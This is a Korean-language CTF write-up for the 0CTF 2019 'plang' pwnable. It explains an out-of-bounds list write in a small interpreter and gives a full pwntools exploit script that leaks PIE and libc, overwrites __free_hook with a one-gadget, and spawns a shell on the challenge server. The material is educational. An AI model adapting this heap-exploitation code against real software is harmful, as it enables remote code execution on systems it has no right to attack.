---
layout:     post
title:      "0CTF 2019 plang write-up"
subtitle:   "0ctf 2019 pwnable"
date:       2019-08-07
author:     "NextLine"
header-img: "img/post-bg-2.png"
tags:
    - WriteUp
---

# 0CTF 2019 plang write-up

### 1. Intro

약간 자바스크립트 엔진 익스하는거랑 비슷해서 재미있게 풀었다.


### 2. Binary

```
YoungJoo_MacBook_Pro # plang$ ls
grammar.md libc-2.27.so* plang* poc
```

문제에서는 문법에 관한 설명과 취약점을 트리거 할 수 있는 poc가 주어졌다.

```c
unsigned __int64 __fastcall cli_mode()
{
  _DWORD *v0; // rdx
  _QWORD *idx; // [rsp+8h] [rbp-428h]
  char buf[1024]; // [rsp+20h] [rbp-410h]
  unsigned __int64 v4; // [rsp+428h] [rbp-8h]
  v4 = __readfsqword(0x28u);
  for ( idx = run_init(); ; run(idx, 5u, v0, buf) )
  {
    printf("> ");
    if ( !fgets(buf, 0x400, stdin) || !memcmp(buf, "exit", 4uLL) )
      break;
    v0 = cli_error(idx, "cli", 3u);
  }
  sub_B091(idx);
  return __readfsqword(0x28u) ^ v4;
}
```

plang의 핵심 로직은 처음에 함수들을 초기화 하고 한줄씩 파싱해서 바이트코드로 변환하고 실행하는 인터프리터이다.


### 3. Vulnerability

```
var a = "This is a PoC!"
System.print(a)
var b = [1, 2, 3]
b[0x80000000] = 0x123
```

poc 파일을 보면 list에 접근할 때 크래시가 발생하는 것을 알 수 있다. (out-of-bounds)


### 4. Exploit

파싱이나 실행에는 특별히 취약점이 없을것 같아서 분석을 안하고 함수 실행 위주로 분석했다. (poc가 있으므로 다른곳에서는 취약점이 없을거라 판단)
1. oob가 극히 제한적이므로 (0x10바이트 / type(8) value(8)) 덮을 구조체를 먼저 찾았다.
2. 문자열을 다루는 구조체의 size를 큰 값으로 덮어 oob를 내고 libc를 leak했다.
3. 문자열을 가지고 있는 list를 만들어 list안에 있는 문자열의 포인터를 freehook으로 덮었다.
4. 이후 freehook에 원샷을 쓰고 free하면 끝.

한가지 재밌는점은 oob를 통해 값을 넣을때 메모리에 double로 들어가 제대로 사용하기 힘들었는데, 숫자를 계속해서 10으로 나누다 보면 10e-5 이런식의 값이 생성되어 우리가 원하는 값을 만들 수 있었다.

```python
#from ntpwn import *
from pwn import *
from struct import pack, unpack
LOCAL = 0
def conn():
    if LOCAL:
        s = process('./plang')
        #b = NT(s)
        #b.tracemalloc()
        #b.bp(0xf9d3)
        #b.bp(0x102CC)
        #b.bp(0x10496) # b[-1234] = 1
        #b.bp(0x105d1) # list.count
        #b.bp(0xFA61) # string.count
        #b.bp(0x1056C) # clear
        #b.end()
    else:
        s = remote('111.186.63.210',6666)
    return s
s = conn()
sla = s.sendlineafter
sa = s.sendafter
def go(cmd):
    sla('> ', str(cmd))
def trans(val):
    f = `unpack("<d", pack("<Q", val))[0]`
    f1 = f[:f.index("e")]
    f2 = f[f.index("e")+2:]
    return (f1, int(f2))
def makeVal(val):
    tmp = trans(val)
    aa = tmp[0]
    bb = tmp[1]
    go('var v=%s' % str(aa))
    go('var idx=0')
    go('while(idx<%d) {idx=idx+1 v=v/10}' % bb)
def makeVal2(val):
    tmp = trans(val)
    aa = tmp[0]
    bb = tmp[1]
    go('var v2=%s' % str(aa))
    go('var idx2=0')
    go('while(idx2<%d) {idx2=idx2+1 v2=v2/10}' % bb)
def makeVal3(val):
    tmp = trans(val)
    aa = tmp[0]
    bb = tmp[1]
    go('var v3=%s' % str(aa))
    go('var idx3=0')
    go('while(idx3<%d) {idx3=idx3+1 v3=v3/10}' % bb)
l = ELF('libc-2.27.so')
makeVal(0x1000000000000)
go('var a = "AAAAA"')
go('var b = [1,2,3,4]')
go('b[-67] = v')
go('System.print(a.byteCount_)')
go('var idx=0')
go('while( idx < 6){System.print(a[0x58+idx]) idx=idx+1 }')
pie = ''
for i in range(6):
    pie += s.recvline()[:-1]
pie = u64(pie + "\x00" * 2)
s.info("pie @ " + hex(pie))
go('var c={"asdf":"bbbb", "ff":1234}')
go('c.clear()')
go('System.print(c)')
go('var idx=0')
go('while( idx < 6){System.print(a[0x1738+idx-0x20]) idx=idx+1 }')
libc = ''
for i in range(6):
    libc += s.recvline()[:-1]
libc = u64(libc + "\x00" * 2) - 0x3edd37
s.info("libc @ " + hex(libc))
pause()
makeVal2(libc+l.symbols['__free_hook']+0x30-8)
go('var b3 = ["EEEEFFFF"]')
go('var b2 = [1,2,3,4]')
go('b3.count')
go('b2[-48] = v2')
makeVal3(libc + 0x4f322)
go('b3[-3] = v3')
# flag{Th1s_language_is_4_bit_p00r}
s.interactive()
```
